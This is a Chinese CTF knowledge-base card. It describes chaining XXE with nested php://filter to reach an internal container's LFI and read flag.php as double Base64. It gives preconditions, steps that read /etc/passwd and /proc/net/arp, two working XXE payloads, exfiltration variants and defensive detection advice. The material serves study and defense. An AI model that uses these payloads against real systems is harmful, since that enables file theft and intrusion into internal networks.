---
id: web-generic-xxe-php-filter-ssrf-internal-lfi-chain
title: XXE + php://filter 双 Base64 链：SSRF 内网 LFI 读取源码与 flag
type: scenario
domain: web
path: web/generic/xxe
technique: xxe-php-filter-ssrf-internal-lfi-chain
tags:
- web
- xxe
- ssrf
- php
- file-inclusion
- php-filter
- docker
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V184
  verified_at: '2026-11-06T20:05:30+08:00'
  notes: 已对照原文与全部8张图片核对：XXE+php://filter外层编码、172.17.0.3 index.php的LFI过滤、内层flag.php双Base64链、两次解码结果与CyberChef截图一致；flag值未写入卡片；未复跑靶场。
url: /docs/web/generic/xxe/web-generic-xxe-php-filter-ssrf-internal-lfi-chain/
draft: false
kb_aliases:
- XXE 内网 SSRF + php://filter
- php://filter 嵌套 LFI
- 双 Base64 读取 flag
- XXE 读内网源码
- Docker 内网 XXE 链
- proc/net/arp 内网发现
---

## 一句话结论

XXE 的外部实体不直接读文件，而是把 `php://filter/read=convert.base64-encode/resource=http://<internal>/index.php?file=php://filter/read=convert.base64-encode/resource=flag.php` 作为 SYSTEM URI：外层 PHP filter 由解析器发起 HTTP 请求并把内网响应 Base64 编码，内层 `file` 参数让内网服务的 LFI 先 Base64 编码 `flag.php`；实体内容因此是“Base64 的 Base64”，两次解码即可拿到源码与 flag，同时绕开内网 LFI 对 `tp`/`input`/`data`/`../` 的字符串过滤。

## 原理

- **XXE 即 SSRF**：`<!ENTITY xxe SYSTEM "…">` 的 URI 由 XML 解析器负责获取；支持 `php://` 流包装器时，解析器会按 PHP 的流语义读取 `resource=` 指向的目标。把 `resource` 设为 `http://172.17.0.3/index.php?...`，解析器就成为访问内网容器的客户端。
- **外层 php://filter 的作用**：`php://filter/read=convert.base64-encode/resource=http://…` 会先通过 HTTP 流读取内网响应，再把响应体 Base64 编码后交给实体。这样实体内容是纯 Base64，不会因为内网返回的 HTML/XML 特殊字符破坏 XML 文档，也便于在回显中提取。
- **内层 LFI**：内网 `index.php` 的逻辑是 `$file=$_GET['file']; include($file);`，并过滤 `../`、`tp`、`input`、`data`。直接传 `http://…` 会因包含 `tp` 被拦截；传 `php://filter/read=convert.base64-encode/resource=flag.php` 不含这四个子串，能通过检查并 `include` 出 `flag.php` 的 Base64 内容。
- **双 Base64**：内网 `index.php` 的响应是 `base64(flag.php)`；外层 `php://filter` 又对整段响应做一次 `base64`，实体内容为 `base64(base64(flag.php))`；第一次解码得到内层 Base64，第二次解码得到 `flag.php` 明文。
- **内网发现**：先通过 `file:///proc/net/arp`（或类似文件读取）拿到 Docker 网段内的其他容器 IP（如 `172.17.0.3`、`172.17.0.4`），再逐个作为 XXE 的 `resource` 主机探测；ARP 表比端口扫描更隐蔽，且不受出网限制。
- **为什么成立**：XXE 解析器允许外部实体且支持 `php://` 包装器；内网服务对解析器可达；内网 LFI 的过滤只做简单子串匹配；`php://filter` 的 `resource` 允许再套一个 URL/流，形成链式读取。

## 触发条件

- 应用存在可利用的 XXE（外部实体未禁用，实体内容有回显或在错误/响应中可见）。
- PHP 环境启用了 `php://filter` 与 HTTP 流包装器，`allow_url_fopen` 未被关闭（或等效能力可用）。
- 解析器所在容器可访问内网其他容器（Docker bridge 网络常见）。
- 内网目标存在 LFI 或任意文件读取，且过滤是简单子串黑名单；目标文件对 Web 进程可读。

## 利用步骤

1. 用 `file:///etc/passwd` 或 `file:///proc/net/arp` 验证 XXE 可读文件，并枚举内网容器 IP。
2. 探测内网 HTTP 服务：把实体 URI 设为 `http://172.17.0.3/`，观察回显/错误/响应时间；确认可达后读取 `index.php` 源码。
3. 读取源码：`php://filter/read=convert.base64-encode/resource=http://172.17.0.3/index.php`，Base64 解码得到 LFI 代码与过滤规则。
4. 构造内层 LFI：`http://172.17.0.3/index.php?file=php://filter/read=convert.base64-encode/resource=flag.php`，确认内层返回 `base64(flag.php)`。
5. 把第 4 步 URL 放进外层 `php://filter` 的 `resource`，XXE 实体回显两次 Base64；连续解码两次得到 flag。
6. 可替换 `flag.php` 为其他源码/配置文件，扩大读取范围。

## PoC

读取内网源码：

```xml
<!DOCTYPE ANY[
  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=http://172.17.0.3/index.php">
]>
<ANY><name>&xxe;</name></ANY>
```

链式读取 flag.php：

```xml
<!DOCTYPE ANY[
  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=http://172.17.0.3/index.php?file=php://filter/read=convert.base64-encode/resource=flag.php">
]>
<ANY><name>&xxe;</name></ANY>
```

解码：

```text
base64_decode(实体内容) -> 内层 base64(flag.php)
base64_decode(内层)     -> <?php // echo "flag{...}"; ?>
```

原文在内网 `172.17.0.3` 的 `index.php` 中看到 `include "flag.php"` 与 `file` 参数过滤，最终两次解码得到 flag；本库未复跑该靶场。

## 变体与关联

- 变体：外层 `php://filter` 可换成 `convert.iconv`/`zlib` 等过滤器，或直接 `http://` 实体读取；内层 LFI 可换成日志包含、`/proc/self/fd`、`data://`（若未被过滤）。
- 变体：无回显时用外部 DTD + 参数实体把 Base64 内容拼进攻击者 URL 外带；或用错误信息、DNS 查询带出。
- 变体：内网服务不是 PHP 时，可把 `php://filter` 换成 `gopher://`、`dict://`、`file://` 或直接 HTTP SSRF，读取其他服务的元数据/管理接口。
- 关联：[[web-generic-xxe-reflected-xml-ssrf-internal-service]]（XXE 驱动内网 SSRF 并二次读取文件）、[[web-generic-xxe-inband-file-read-default-insecure]]（XXE 有回显文件读取基础）、[[web-php-file-inclusion-filter-chain-fileless-rce]]（PHP filter 链的 RCE 变体）、[[web-generic-file-inclusion-download-param-source-disclosure]]（LFI 源码泄露）。

## 检测与防御

- **检测**：XML 请求中出现 `php://filter`、`convert.base64-encode`、`resource=http://`、`file=php://` 等嵌套流；XXE 响应中出现长 Base64 字符串；同一来源在短时间内请求多个内网 IP/端口。
- **主机/网络**：解析器进程向 Docker 网段或非业务内网发起 HTTP；`/proc/net/arp`、`/etc/hosts` 等文件被读取；Web 进程 `include` 了 `php://` 流。
- **防御**：禁用外部实体与 DTD（PHP 用 `libxml_disable_entity_loader(true)` 或 `LIBXML_NONET`，Java 设 `disallow-doctype-decl` 等）；关闭不必要的流包装器（`allow_url_include=Off`、限制 `allow_url_fopen`）；内网服务间加认证与网络策略，禁止 Web 容器随意访问其他容器；LFI 参数使用白名单映射而非直接 `include`，过滤要做规范化/realpath 校验而非子串黑名单。
- **加固**：错误信息不回显解析细节；对 XXE  payload 做 WAF 规则（`<!ENTITY`、`SYSTEM`、`php://`）；容器网络分段，限制解析器出站。
